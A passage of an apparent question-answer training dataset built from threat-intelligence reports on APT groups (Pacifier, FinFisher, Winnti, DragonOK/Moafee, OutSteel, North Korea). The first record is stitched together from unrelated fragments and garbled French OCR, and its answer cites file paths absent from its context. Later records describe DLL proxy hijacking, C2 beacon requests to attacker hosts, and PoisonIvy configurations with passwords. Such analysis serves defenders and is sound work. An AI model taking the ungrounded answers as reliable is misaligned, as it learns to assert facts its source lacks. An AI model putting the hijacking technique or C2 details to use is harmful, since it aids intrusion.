acc2250be782063f268b87bd0f798549c5838b95 aecf66120861b71c92a2d1f0015fc9228c02ee88 b2700f16e4494ef7eba26b88a800728621adffea b4afc5e0002201ce052466cba9061018474b1de0 b55dac24f646dd5e0ea856d6ed7891ad8c8acdc1 b84ef6480d888b560b071e1f97e78f06080dae89 c340534b8eafed85fc6e9950033b0b9e696d5cb0\nc4b06021c6c925c837dab3ba42c6b76eb77ad30b c5166d1a574bc5e374490846f2584f94f755d90b c9b1208be2aa2c5cfbcbfcb9b1a45c36854414b8 ce234ed0899c8f97e3f2085215b842723a773368 d80d5ccb9d37d971a408d3c91f803e40b8421a2c d83d7de186fa6c7abe4676eb568ba4dc62a7c931 e20b0f03f6708118bca9f408b156b210ba083b54 eacadedc31af04ef86470aec62ad3eccc9a35332 eb0f02e36e77221366becabc60e78dd43368ab9d eb1b83825ff28de7f13812bfce273ad7fb1994fb ede8ec9f3efeb515859becd1f430f82933b42dd9 edf96c42f4e1cf43fbaab3f0bbf54280fc8e311d eea9fec97dca5d122069adf6dd71628bd6d9c2fd f9af4a51616db485adc577ad600b60e77916cace fbd538cf432f2576b37e2770f860b70b009c3cf3 01e2e16be5828ca03c6b78f253bd962bfaa5ccbf 09df1b0abd32791c3b0d5d657cd956f81e2dacb2 0a9dd2b71df68ba088d7d868d7e191875755e34c 14b6f2bc2b869d3417619201c7205e240a93d2ef 1ae10d6ec5d33b704c32ef52c3ee9671f4298d5f 1e49924afe56e3c782893118a51256ca5f247fba 23d5cc54641f56f554890bbd55d580e5c564e197 26f8d64038439c006f12ec34b035b1dee1c56b31 272c42bcdcc88adba1e01e60a931fbe5f5800883 2a84f90ed23a569defee7b37f4650aca4021a767 2bf06a003a9bd56d2ed91770966a7aee7d9784b9 321ca51b4c250515bc3075abe735e360a57dee22 33f57151a52666ca055f1dc66ef04e2f9cb09918 3e10fd3e8d4c4a7900e603aee7660c83441d998e 3fbaf98c75992db9db11d29ae20c13b7b0f50470 443551d822eba6a81b8ac3177e31e210c99934d0 45c7f3f065cf015289ab17161a1880eb638b508a 46f1b8722f8f094015c749599e94a3e44850df0a 4f35665e689bea4f116505f81ae2906fd1517128 547f525f57f3f47222ae3ab253635df936bd355a 585550816539b73dfdc3cee80cc60e1cdc1cdb3e 5d492ae763bfc227db9eea46e560124128ff925b 5ff776d23e6c6af47619ad2e7333a434b79e19df 621698f821a2bafccad026f9f5d2fe1ac46a39ce 66ec04c005d0a1ebc218455915e31d2a2b6dd459 686ada60c898782b57ca993141b64f7c7a531c50 6c68a9df2d710187d067ecb2d0cc04358d570b52 6e070e01076a4a92f08924a405f389436003d927 78499e4694f847972576960a04f8177691a7c911 840563929f13ab05e45a8d3fb2d11e70e3cdccca 840de34aa767131eb34069e6f936dea3a48c024e 85a6e3a3fcee71ffa2aad90336960132fa8f4c4d 88f473f3d7a7eb2637754a8d0856ab888066ab08 8f8d7cd742fb843ba8cb16c2b2d6349436049ed8\n8ffd436182f8d2a7ec0a66c0d6d43f71222f62b5 92731e4ed149c59a25c233635c55a87a8a22b19f 96d9cf7296f02bf4e49c0540fb84981493b61a93 9957af2dbfa04bca2a5319a216852ce4f4a17682 9b0effd20ea7239275b6cf1e02280eb67eced701 a5daecfd57f006acd15486bd544f40e4cdce3801 a753de6b2e6d3d5735fc5e90a879f1ad7e93fb0f b0b9215e236bb47f5f0a108be97b24d20898d2fc b35b07ad4f42493ecb19f66aba83da8e74c1bb5a b4e867893d9d6f8b52de98ab6b41513d61f20472 ccf0a302eb264cbb5db726d61ad18ebdc0d3d012 d53eb2a6904d1fb7982bb876916cd3723c3dc9b1 d6d3d9a56513b83db497a8d4701c2ac7270d78eb d7218e80261517badd8090d3a5ba0a1ed21c21a2 d74d8ec530c02b1eb94203de1f641e15a72faf8d e32832e3f0e0b8450e7bdded16c441951b171130 eda30afac2c1fa0ed2c80e8859e2556ea3dfe2ef ee1f5ba06400fa192664f984d71b1a0cdba96d75 f781e603c55558708ac3101d0bfee2c1752693c2 fdb9d026502aa64aa23b1acb96f6d0013ef874b4\nb719e1d03e860235a68dda4168f29ac4988d25de ba29c29a35d15a668ea2ea79d1d4e56c2d67553f bca5accb9f1d0806f8603cf74ce0ebe9519f5004 be10c837af1f25ee67440f3a33da8c650f5ab54a c34a68c1a2d2beddbbe8ee8bd125cce14d0dc377 c3bc94b065449879c25a541d740346e060d9d6fe c414ba1dd1f281a63e58c60eb1d8cb4ac3c4e7f0 c7accc1c4ceedc756c30ebb2f1ff9f0dbd0255b0 c8395601ea301ba083cb530dad7a44c8048eeb77 ca07bbfc5e8c15c4258f92e6e6c328b86b7b19a5\nSmall Headline: International politics\nText is a Bloomberg news story from October 24th: Bulgaria, Romania and Serbia Ready to Close Borders for Migrants.\nBudget plan template\nThis one looks as a budget calculation template taken from \"Relations internationals et Francophonie\" of Quebec.\nFiche BUDGET G.LOBAl ,do projet \u2022Format sugg,ere. Les oepenses et reve.ntJ.s IM.iqu-es d-dl!!!.sou-s ne Je S-DJ1t .qu'A ti [!Jormes_d u proara m meP-our con naittre les. depen ses adm Issi bles, vol r document adml:s-slbles 4\nTITRE DU PR,QJ ET' :\u00b7\nBig Headline: PARTIE FRANCAJ'SE\nBitdefender is a global security technology company that delivers solutions in more than 100 countries through a network of value-added alliances, distributors and reseller partners. Since 2001, Bitdefender has consistently produced award-winning business and consumer security technology, and is a leading security provider in virtualization and cloud technologies. Through R&D, alliances and partnership teams, Bitdefender has elevated the highest standards of security excellence in both its number-one-ranked technology and its strategic alliances with the world's leading virtualization and cloud technology providers. More information is available at http://www.bitdefender.com/\nAll Rights Reserved. \u00a9 2015 Bitdefender. All trademarks, trade names, and products referenced herein are property of their respective owners. FOR MORE INFORMATION VISIT: enterprise.bitdefender.com\nBD-Business-Jun.30.2016-Tk#: 70585\nQuestion: In the context of the Pacifier APT, what file paths were used by the malware to store its components, and how does this information help in detecting and mitigating such attacks?",
    "output": "Answer: The Pacifier APT used specific file paths to store its components, including %APPDATA%\\\\Microsoft\\\\Word\\\\MSWord.exe, %APPDATA%\\\\Axpim\\\\ubfic.exe, %TEMP%\\\\ntlm.exe, and various others listed under the 'File paths' section. This information is crucial for detecting and mitigating such attacks because it allows security professionals to monitor these paths for unusual activity. By knowing where the malware typically stores its files, defenders can set up alerts and automated responses to block or quarantine suspicious files, thereby preventing the malware from executing its payload.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Part 2: Country Findings\nIn this section, we provide a list of likely FinFisher government users identified by our scans, and also map out which FinSpy relays serve which FinSpy Masters.\nBelow, we identify 33 likely government users of FinFisher in 32 countries, based on the presence of a FinFisher master at an IP address in a countryor belonging to a specific government department.\nIn presenting our scan results, we do not wish to disrupt or interfere with legitimately sanctioned investigations or other activities. Instead, we hope to ensure that citizens have the opportunity to hold their governments transparent and accountable. To this end, we identify government users, but redact certain details we have discovered about their infrastructure whose disclosure might interfere with legitimately sanctioned activities. Redacted details include the last octet of live IP addresses, and part of live domain names. Appendix A contains a full list of countries and servers.\nThe following is a list of countries where neither our previous research nor documents disclosed by Wikileakshad previously found evidence of a FinFisher deployment: Angola, Egypt, Gabon, Jordan, Kazakhstan, Kenya, Lebanon, Morocco, Oman, Paraguay, Saudi Arabia, Slovenia, Spain, Taiwan, Turkey, and Venezuela.\nIn the diagram below, we map out FinFisher proxy networks: the FinSpy Relay servers we found, and the FinSpy Masters to which we linked them:\nGiven previous reports that observed weaknesses in certain cryptography that FinFisher uses to transmit information from an infected device to the FinSpy master, locating FinFisher collection infrastructure in another country could potentially invoke concerns about \"fourth party\" collection, where a government collects data collected by another government's surveillance operation. We have also previously identified potential legal concerns regarding locating relays in other countries.\nQuestion: How does the placement of FinSpy Relay servers in third countries potentially raise concerns about 'fourth party' collection, and what are the legal implications of this practice?",
    "output": "Answer: The placement of FinSpy Relay servers in third countries raises concerns about 'fourth party' collection because it involves one government collecting data that was initially gathered by another government's surveillance operation. This practice can lead to potential legal issues, as it may violate the privacy laws and regulations of the countries where the relays are located. Additionally, it can complicate international relations and raise ethical questions about the responsibility and accountability of governments engaged in such activities.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: Intelligence and counterintelligence\nNorth Korea's intelligence program is one of its strongest military assets, providing foundational support for all other military operations. The regime's cyber warfare capabilities, in particular, rely heavily on open-source intelligence (OSINT) collection and cyber-espionage. 170 As noted in a CIA publication, \"It is a significant irony of our information age that open-source intelligence is contributing to the survival and development of one of the world's most secretive regimes.\"171 Historically, the primary goals of the regime's intelligence program included collection and dissemination of intelligence concerning any possible political, military, or economic threat to the regime's security and stability. Secondary goals have included \"acquisition of foreign military and civilian technologies and equipment, support of the DPRK's foreign policy goals, training and\nsupport for foreign revolutionary and terrorist organizations, and the acquisition of foreign capital for state and intelligence operations.\"172\n165 http://www.scribd.com/doc/15078953/Cyber-Threat-Posed-by-North-Korea-and-China-to-South-Korea-and-US-Forces-Korea\n166 http://www.apcss.org/Publications/Edited%20Volumes/BytesAndBullets/CH2.pdf\n167 http://www.theguardian.com/technology/2011/aug/04/south-north-korean-hackers-china\n168 http://english.chosun.com/site/data/html_dir/2011/05/06/2011050600827.html\n169 http://www.zdnet.com/blog/security/north-korea-ships-malware-infected-games-to-south-korean-users-uses-them-to-launch-ddosattacks/12383\n170 http://docs.house.gov/meetings/AS/AS00/20140402/101985/HHRG-113-AS00-Wstate-ScaparrottiUSAC-20140402.pdf\n171 https://www.cia.gov/library/center-for-the-study-of-intelligence/csi-publications/csi-studies/studies/vol48no1/article04.html\nNorth Korea has a broad reach for intelligence collection, which extends to cyber intelligence.173 In April 2013, Solutionary, a company providing managed security services, reported a marked increase in both overt attacks and information gathering attempts originating from North Korean IPs. Solutionary refers to any overt external attacks on company networks or attempts to steal data as \"touches.\" They reportedly recorded 12,473 of these touches in February 2013, 11,000 of which were directed at a single financial institution. As a baseline, Solutionary noted that typically only 200 incidents per month are traced to North Korean origin.174 This is an interesting claim, considering that attacks attributed to North Korea are usually routed through other countries.\nA faction of ethnic North Koreans residing in Japan, known as the Chongryon, are critical to North Korea's cyber and intelligence programs.\nAs mentioned above, a faction of ethnic North Koreans residing in Japan, known as the Chongryon, are critical to North Korea's cyber and intelligence programs and help generate hard currency for the regime. The Chongryon headquarters has been recognized as the de facto North Korean embassy in Japan. In 2012, the organization's headquarters was seized to pay for the group's past due debts.175\n172 http://www.apcss.org/Publications/Edited%20Volumes/BytesAndBullets/CH13.pdf\n173 http://docs.house.gov/meetings/AS/AS00/20140402/101985/HHRG-113-AS00-Wstate-ScaparrottiUSAC-20140402.pdf\n174 http://www.usatoday.com/story/tech/2013/04/26/cyberspying-from-north-korean-ip-addresses-spike/2115349/\n175 http://sundaytimes.lk/?option=com_content&view=article&id=21034:japan-court-approves-seizure-of-nkorea-embassymedia&catid=81:news&Itemid=625\n176 http://www.nknews.org/2014/02/chongryon-still-pyongyangs-pawn-in-covert-operations-former-intelligence-officer/\nIt was then purchased by a monk named Ekan Ikeguchi, who let the Chongryon continue to use the building in what he referred to as a \"goodwill gesture\". Ikeguchi is one of the Chongryon's many ties to organized crime. Ikeguchi was arrested in the past for an attempted coup against the Japanese government. He also has ties to the political group Nihon Seinensya, which is involved in illegal activities in conjunction with the yakuza syndicate Sumiyoshi-kai, which imports and sells amphetamines made in North Korea.177 North Korea also has black market ties to Sumiyoshi-kai's rival syndicate, Yamaguchi-gumi. Many members of the Kodo-kai, Yamaguchi-gumi's ruling faction, are Korean-Japanese, with ties to North Korea.178 Masahiro Namikawa, leader of the drug trafficking Seido-kai yakuza organization, also has ties to the Chongryon.179\nThe Chongryon operate at least two websites, chongryon.com, which is in Japanese, and korea-np.co.jp.\nWHOIS records for chongryon.com indicate that it was registered by \"guanin o\" using the email address park2@mac.com. The WHOIS information for korea-np.co.jp. shows that it was registered by Choson Shinbo Company Inc. The WHOIS records for these sites can be found in .\nAdditionally, the Chongryon operate a ferry called the Mangyongbong-92, the only direct transit from Japan to North Korea. In 2003, they were suspected of using the ferry to smuggle missile parts.180 In 2006, the ferry was temporarily banned from Japanese waters when Japanese officials discovered the Chongryon were using it to smuggle dual-use electronics to North Korea to be used for military purposes. 181\nNorth Korea has a global network of state-run businesses located in 30 to 40 countries that is used for espionage activities. The Reconnaissance General Bureau is responsible for oversight of this network.182 The businesses include cafes and other non-suspect establishments. The highest concentration of these is in China. Members of this espionage network reportedly \"send more than $100 million in cash per year to the regime and provide cover for spies.\"183 These establishments are also used for money laundering and drug trafficking.184\nNorth Korea has a global network of state-run businesses located in 30 to 40 countries that is used for espionage activities. These establishments are also used for money laundering and drug trafficking.\nThe regime is also known to kidnap foreign citizens and use them as instruments for intelligence. Prisoners are first tortured and psychologically conditioned to bend to the regime's will. They are then used based on their skillset. This may include teaching their language to North Koreans, spreading propaganda in their native language, providing translation services,\nconducting military training, or other skills the regime deems useful.185 In July 2014, Japanese officials agreed to lift some sanctions on North Korea when the regime agreed to investigate the whereabouts of Japanese citizens who were allegedly abducted by North Korean agents decades ago. Sanctions to be lifted include the ban on port calls to Japan by North Korean ships.186\n177 http://japandailypress.com/religious-group-that-bought-north-korean-embassy-building-has-mob-ties-0826568/\n178 http://culturmag.de/crimemag/jake-adelstein-the-yakuza-2/20212\n179 http://www.thedailybeast.com/articles/2013/06/25/the-great-japanese-gang-wars.html\n180 http://news.bbc.co.uk/2/hi/asia-pacific/2958968.stm\n181 http://www.washingtontimes.com/news/2006/oct/16/20061016-122859-4745r/\n182 http://www.ibtimes.com/north-koreas-international-network-restaurants-used-gain-hard-currency-espionage-1427242\n183 http://www.outsideonline.com/outdoor-adventure/politics/Did-North-Korea-Kidnap-This-AmericanHiker.html?utm_content=buffer6bd46&utm_medium=social&utm_source=twitter.com&utm_campaign=buffer\n184 http://freebeacon.com/national-security/north-koreas-overseas-restaurants-used-for-espionage-and-gaining-hard-currency/\nNorth Korea has also infiltrated important positions in South Korea for both intelligence and psychological operations purposes. 187 In 2011, South Korea's National Intelligence Service reportedly discovered the presence of Communist spies. These spies within their trusted circles had been reporting back to North Korea for almost 10 years. The embedded spies included a Democratic Party representative. According to the agency, the spies were on a mission to infiltrate and influence the Democratic Party and to gather military intelligence.188 The regime also attempts to infiltrate organizations made up of North Koreans who seek shelter in South Korea, in order to gain intelligence. In the past several years, South Korea has arrested at least 14 defectors who were found to be spies.189\nThese intelligence collection and counterintelligence capabilities are an attempt to provide the regime with a strategic asymmetrical advantage. The regime leverages its human and cyber resources around the globe to provide an influx of intelligence, while very little credible intelligence about the regime's activities and capabilities ever becomes available to the outside world.\n\nQ: What role do ethnic North Koreans residing in Japan, known as the Chongryon, play in North Korea's cyber and intelligence programs, and how do they contribute to the regime's financial stability?",
    "output": "A: The Chongryon, a faction of ethnic North Koreans residing in Japan, plays a critical role in North Korea's cyber and intelligence programs. They help generate hard currency for the regime and are considered the de facto North Korean embassy in Japan. Their headquarters was seized in 2012 to pay off debts but was later purchased by a monk with ties to organized crime, allowing the Chongryon to continue using the building. The Chongryon operates websites and a ferry service, which has been suspected of smuggling missile parts and dual-use electronics to North Korea. Their ties to organized crime and drug trafficking further support the regime's financial stability.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: The Commercial Interest\nAs has been stated above, APTs can target any commercial company if cyber-criminals find a way to financially profit from the attack.\nSo what methods do cyber-criminals use to generate illicit earnings from attacks on gaming companies?\nBased on the available information, we have singled out three main monetization schemes that could be used by the Winnti team.\n\uf0b7 The unfair accumulation of in-game currency/\"gold\" in online games and the conversion of virtual funds into real money.\n\uf0b7 Theft of source code from the online games server to search for vulnerabilities in games \u2013 often linked to point 1.\n\uf0b7 Theft of source code from the server part of popular online games to further deploy pirate servers.\nLet's look at an example. During our investigation of an infection at a computer gaming company, we found that malware had been created for a particular service on the company's server. The malicious program was looking for a specific process running on the server, injected code into it, and then sought out two places in the process code where it could conceal call commands for its function interceptors. Using these function interceptors, the malicious programs modified process data which was processed in those two places, and returned control back. Thus, the attackers change the normal execution of the server processes. Unfortunately, the company was not able to share its targeted application with us, and we cannot say exactly how this malicious interference affected gaming processes. The company concerned told us that the attackers' aim was to acquire gaming \"gold\" illegally.\nMalicious activity like this has an adverse impact on the game itself, tilting the balance in favor of cheats. But any changes the Winnti team introduces into the game experience are unlikely to be very noticeable. After all, maintaining a skillful balance is the main attribute of online games. Users will simply stop playing if they feel that other players are using non-standard methods to create an advantage beyond normal gameplay or if the game loses its intrinsic competitiveness due to resources or artifacts appearing in the game without the developers' knowledge. At the same time, the attackers are keen for the game to remain popular; otherwise, they would be unable to effectively turn all the time and effort of infecting a gaming company into financial gain.\nMembers of the Winnti team are patient and cautious. Cyber-criminals have affected the processes of the online games from the infected companies and stolen money from them for years, but they have found ways of doing this without attracting attention to themselves.\nMedium Headline: The Initial DLL\nEverything starts with a DLL. The DLL mimics one of the standard Windows libraries, winmm.dll or apphelp.dll. Since, in the vast majority of cases the samples that we detected disguised themselves as winmm.dll, we would like to fix this name for this malicious library at the end of this document.\nLegitimate winmm.dll is a Windows system library that provides multimedia functions. It is located in the %WINDIR%\\System32 folder. The attackers counted on this being a library providing basic system functions and hence the probability of it being loaded by some program is very high (this is also valid for apphelp.dll). For example, winmm.dll is loaded by explorer.exe, which is launched during operating system startup and is essential for Windows user interface.\nThe mechanism to start the malware is simple: if some benign application depends on Windows winmm.dll (located in %WINDIR%\\System32\\winmm.dll) but the evil twin library with the same name (winmm.dll) is located in the folder of benign application, the malicious library will be loaded instead of the system one.\nTaking advantage of their control of an infected computer, the attackers place a malicious library in the %WINDIR% folder. The same folder also contains explorer.exe. This enables the attackers to ensure that the malicious DLL is loaded at system startup: explorer.exe loads the malicious winmm.dll from the %WINDIR% folder as soon as it launches during system startup.\nBut how can a program which depends on the original library work correctly if a malicious winmm.dll is loaded instead of the original library? Very easy: the malicious library is designed to work as a proxy for the original winmm.dll from the %WINDIR%\\System32 folder.\nThe cyber-criminals did not reinvent the wheel to make sure that everything works properly. They relied on a tool known as AheadLib, which was developed by security researchers to analyze malware.\nThis program, which is designed to facilitate the analysis of malicious libraries, was created by a Chinese developer employed by an Asian anti-virus vendor. The program accepts a DLL on input and produces a C code which hooks the functions included in the library. The C code is compiled back into a DLL, which can then be used as a proxy and provide flexible way to analyze behavior of malicious file.\nHook functions (code generated by the legitimate program AheadLib)\nThe flexibility of this tool allows to customize the logics of malicious application during analysis and overload functions code to provide some debugging output. Some code can be added to display parameters of the hooked functions in order to find out which values are passed to the original functions when they are called. This method is used in so called dynamic analysis of malicious applications.\nDetermining the addresses of the real functions (error message in the frame: \"Function %hs cannot be found, the program will not operate correctly\")\nModified module loading the original DLL\n(error message in the frame: \"%s cannot be loaded, the program will not operate correctly\")\nIronically, the malware authors have found this to be a convenient application for creating malicious proxy-libraries. They specified a system library (winmm.dll) as a parameter for AheadsLib tool and produced a source code template to create a proxy DLL \u2013 in the form of C file. By overloading some functions with the malicious payload, the attackers created a complete piece of malware that included all the features of the system DLL.\nStrangely, the attackers kept the code for AheadLib debug messages in the early versions of their malware (marked with red in the screenshots above). These strings can also be found in compiled malicious binaries:\nThe function %hs cannot be found, the program will not operate correctly\n%s cannot be loaded, the program will not operate correctly\nLater, these fragments were removed from the C file generated by AheadLib.\nQuestion: Describe the initial DLL used by the Winnti group to start their malware. How does this DLL mimic a standard Windows library, and what tool do the attackers use to ensure proper functioning of the malicious library?",
    "output": "Answer: The Winnti group's malware starts with a DLL that mimics standard Windows libraries, such as winmm.dll or apphelp.dll. The legitimate winmm.dll is a Windows system library that provides multimedia functions and is located in the %WINDIR%\\System32 folder. The attackers rely on the likelihood that this library will be loaded by some program. The malicious DLL is placed in the %WINDIR% folder, ensuring it is loaded at system startup when explorer.exe launches. To ensure proper functioning, the malicious library acts as a proxy for the original winmm.dll. The attackers use a tool called AheadLib, developed by security researchers, to create this proxy DLL. AheadLib generates C code that hooks the functions included in the library, allowing the malicious DLL to include all features of the system DLL while adding malicious payload.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Sysget/HelloBridge\nThis tool has recently been analyzed by Secure-works 10. We observed the DragonOK attacker employ this tool against targets in Japan and Taiwan (e.g. 57e3d002542e07f2eb09fd2b1b0eeab2), as also noted by Secureworks. We have not yet seen the Moafee group use this tool. This implant has the following beacon format:\nGET /el/sregister.php?name=[REDACTED]\nHTTP/1.1\nUser-Agent: Mozilla/5.0 (compatible; MSIE 10.0;\nWindows NT 6.1; Trident/6.0)\nHost: 122.10.62.137\nConnection: Keep-Alive\nOther URI formats include:\n/el/slogin.php?uid=\n/el/suploadfile.php?item=\n/el/suploadfile.php\nMedium Headline: Mongall\nFireEye has previously analyzed this backdoor11 , which is used by multiple other groups in addition to DragonOK and Moafee. DragonOK in particular is known to frequently use this implant (e.g. e8d77d19e1c6f462f4a5bf6fbe673a3c), which has the following network beacon format:\nGET /3000FC080000[REDACTED 00000000 0000000000000000000000000000000000 0000000000000000000000000000000000 0000000000000000000000000000000000 00100000[REDACTED]0000000000000000 000000000000000000000000000000000 0 0000000000000000[REDACTED]000000 HTTP/1.1 User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/6.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0) Host: mail.jpaols[.]com:443\nCache-Control: no-cache\nMedium Headline: PoisonIvy\nThis is a publicly available RAT used by multiple threat actors, which has been extensively analyzed in a previous FireEye white paper12 .  The extracted configuration blocks from a \"DragonOK\" PoisonIvy variant (65fcc9b9ff608801edc697552438cfee), is shown below:\nID: ftp\nDomains: ftp.skydnastwm.com:15836|\nPassword: Ecp982*@Me2\nMutex: fftp\nIn contrast, here is an extracted PoisonIvy configuration block from a \"Moafee\" instance (9ebe86a648b1f19836251f946a160b16), as shown below:\nID:\nDomains: afp.mozjlla.com|\nPassword: 741526\nMutex: )!afpA.I4\nMedium Headline: Campaign #1: Moafee\nWe have observed the Moafee group target the governments and militaries of countries with national interests in the South China Sea. We have also observed this group target companies within the US defense industrial base.\nAs discussed, we have observed the Moafee group use a number of different tools including Poison Ivy, Nflog, Mongall, and NewCT2.\nWe found this group running HTRAN on one of their front-end command and control servers. The command and control server in question was\nlocated at 58.64.201.229. We monitored this server for two months, from January to March this year. During this time period, we observed the following domains resolving to 58.64.201.229:\n10 http://www.secureworks.com/resources/blog/research/hellobridge-trojan-uses-heartbleed-news-to-lure-victims/\n11 http://www.fireeye.com/blog/technical/malware-research/2014/03/spear-phishing-the-news-cycle-apt-actors-leverage-interest-in-the-disappearance-of-malaysian-flight-mh-370.html\n12 http://www.fireeye.com/resources/pdfs/fireeye-poison-ivy-report.pdf\n13 http://en.wikipedia.org/wiki/South_China_Sea#Resources\n14 http://www.ifri.org/downloads/ifricanonopedseamanecs.pdf\n15 http://www.eia.gov/countries/regions-topics.cfm?fips=scs\nph.moafee[.]com afp.mozjlla[.]com mofa.mozjlla[.]com acer.moafee[.]com del.moafee[.]com jnt.moafee[.]com pcg.moafee[.]com sslc.moafee[.]com at.moafee[.]com lw.moafee[.]com ks.moafee[.]com\noa.moafee[.]com xxpp.moafee[.]com hp.moafee[.]com gumm.mozjlla[.]com msn.moafee[.]com\nDuring this same time frame, the HTRAN client at 58.64.201.229 was observed attempting to connect to a number of different backend HTRAN servers. All of these HTRAN servers were located in the Guangdong Province and operated by CHINANET.\nAdditionally, the Moafee group also hosted a PoisonIvy command and control server at phi. crabdance[.]com. Between April 30, 2012\n13 http://www.fireeye.com/blog/technical/malware-research/2014/03/spear-phishing-the-news-cycle-apt-actors-leverage-interest-in-the-disappearance-of-malaysian-flight-mh-370.html\n12 http://www.fireeye.com/resources/pdfs/fireeye-poison-ivy-report.pdf\nand July 1, 2012, the phi.crabance[.]com domain resolved to 98.126.91.66. This IP was observed hosting a HTRAN proxy client, which was seen connecting to a backend HTRAN server hosted at 113.66.248.60. This server was also located in the Guangdong Province and operated by CHINANET.\nIn short, the Moafee group was observed consistently hosting their backend HTRAN servers in Guangdong. This observation may reveal that the Moafee group is physically located in this province.\nMedium Headline: Campaign #2: DragonOK\nWe have observed the DragonOK group target high-technology and manufacturing companies in both Japan and Taiwan. This group has used similar malware to the Moafee group described above. Specifically, we observed DragonOK employing PoisonIvy,\nNflog, Mongall, CT, and NewCT.\nLike the Moafee group, we observed the DragonOK group running an HTRAN proxy client on one of their front-end command and control servers. For approximately one week, between July 31, 2013 and August 8, 2013, the domain www.ndbssh[.]com served as a command and control server for Mongall payloads distributed by the DragonOK group. During this time, DragonOK also ran an HTRAN proxy client on www.ndbssh[.]com.\nThis HTRAN client was seen attempting to connect to three different HTRAN servers located in the Jiangsu province and operated by CHINANET.\nThe domain www.ndbssh[.]com resolved to 206.161.216.219 between 2013-09-28 and\n2013-10-04. The following other domains were seen resolving to this same IP:\nThe DragonOK group was observed hosting their backend HTRAN servers in Jiangsu. This observation may reveal that the DragonOK group is physically located in the Jiangsu province.\nBig Headline: Conclusion\nBased on the geolocation evidence provided in this paper, it appears that different operators executed the Moafee and DragonOK campaigns. This conclusion is supported by the following assessments:\n\u2022 The campaigns target different industries in different geographic locations. The Moafee campaign targets government and military organizations in countries with national interests in the South China Sea. In contrast, the DragonOK campaign has been observed targeting high-technology and manufacturing companies in Japan and Taiwan.\n\u2022 The campaigns maintain separate back-end command and control infrastructures hosted in different provinces in Mainland China. The Moafee campaign can be traced to infrastructure located in the Guangdong province, whereas the DragonOK campaign can be traced to infrastructure located in the Jiangsu province.\nWhile it seems that different operators are responsible for these two campaigns, our research showed that these operators share a number of common tools, techniques and procedures (TTPs). We also believe a separate third group is using these TTPs but we do not have sufficient insight to this operator at this time. The shared TTPs include:\n\u2022 Usage of the same custom backdoors and RATs such as CT/NewCT/NewCT2, Mongall, Nflog, as well as off-the-shelf RATs such as PoisonIvy, to maintain access to the victims' networks.\n\u2022 Usage of HTRAN to proxy their command and control communication.\n\u2022 Usage of the same evasion techniques to evade detection such as environment checks based on CPU cores, password protected documents, and the use of large null padded files.\nWe assess that these shared TTPs may be the result of:\n\u2022 A direct relationship between the operators.\n\u2022 An indirect relationship such as the completion of a common training regimen.\n\u2022 A common quartermaster or supply-chain for their malware tools.\nBig Headline: About FireEye, Inc.\nFireEye has invented a purpose-built, virtual machine-based security platform that provides real-time threat protection to enterprises and governments worldwide against the next generation of cyber attacks. These highly sophisticated cyber attacks easily circumvent traditional signature-based defenses, such as next-generation firewalls, IPS, anti-virus, and gateways. The FireEye Threat Prevention Platform\nprovides real-time, dynamic threat protection without the use of signatures to protect an organization across the primary threat vectors and across the different stages of an attack life cycle. The core of the FireEye platform is a virtual execution engine, complemented by dynamic threat intelligence, to identify and block cyber attacks in real time. FireEye has over 1,900 customers across more than 60 countries, including over 130 of the Fortune 500.\nFireEye, Inc.  |  1440 McCarthy Blvd. Milpitas, CA 95035  |  408.321.6300  |  877.FIREEYE (347.3393)  |  info@fireeye.com  |  www.fireeye.com\nQ: How does the DragonOK group use the Sysget/HelloBridge tool, and what are some of its notable characteristics, including the beacon format and user agent strings?",
    "output": "The DragonOK group employs the Sysget/HelloBridge tool against targets in Japan and Taiwan. This tool has specific beacon formats and user agent strings. The beacon format includes GET requests such as '/el/sregister.php?name=[REDACTED]', '/el/slogin.php?uid=', '/el/suploadfile.php?item=', and '/el/suploadfile.php'. The user agent string used is 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)', indicating the use of Internet Explorer 10 on Windows 7.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Conclusion\nUnit 42 research discovered a threat group targeting an energy organization that is part of Ukraine's critical infrastructure. This attack is part of a year-long campaign of attacks that not only targeted Ukrainian government organizations, but also foreign nations' embassies in Ukraine. The threat group delivered a malicious payload called OutSteel that is capable of automatically exfiltrating various types of files, including documents, archives, database files and files containing email-related data. Based on the list of targeted organizations and the use of a file exfiltration tool, we believe this threat group's primary goal is to steal sensitive information for the purpose of situational awareness and leverage in dealing with Ukraine.\nFor Palo Alto Networks customers, our products and services provide the following coverage associated with this campaign:\nprotects endpoints from the SaintBot malware described in this blog.\ncloud-based threat analysis service accurately identifies the malware described in this blog as malicious.\nUsers of the  contextual threat intelligence service can view malware associated with these attacks using the ,  and  tags.\nPalo Alto Networks has shared these findings, including file samples and indicators of compromise, with our fellow Cyber Threat Alliance members. CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors. Learn more about the (<https://www.cyberthreatalliance.org/>)Cyber Threat Alliance.\nBig Headline: Payload Hashes\n005d2d373e7ba5ee42010870b9f9bf829213a42b2dd3c4f3f4405c8b904641f2 0222f6bdfd21c41650bcb056f618ee9e4724e722b3abcd8731b92a99167c6f8d 0c644fedcb4298b705d24f2dee45dda0ae5dd6322d1607e342bcf1d42b59436c 0e1e2f87699a24d1d7b0d984c3622971028a0cafaf665c791c70215f76c7c8fe 0f7a8611deea696b2b36e44ea652c8979e296b623e841796a4ea4b6916b39e7c 0fc7154ebd80ea5d81d82e3a4920cb2699a8dd7c31100ca8ec0693a7bd4af8b7 137fc4df5f5cad2c88460314e13878264cc90d25f26b105bb057f6bfdca4cbf2 17c3cf5742d2a0995afb4dd2a2d711abe5de346abde49cf4cf5b82c14e0a155f 187e0a02620b7775c2a8f88d5b27e80b5d419ad156afc50ef217a95547d0feaa 18f24841651461bd84a5eac08be9bce9eab54b133b0e837d5298dac44e199d5f 1a1fe7b6455153152037668d47c7c42a068b334b91949739ed93256d5e3fbd89 1e6596320a3fa48d8c13609a66e639b35fb1e9caae378552956aa9659809162b 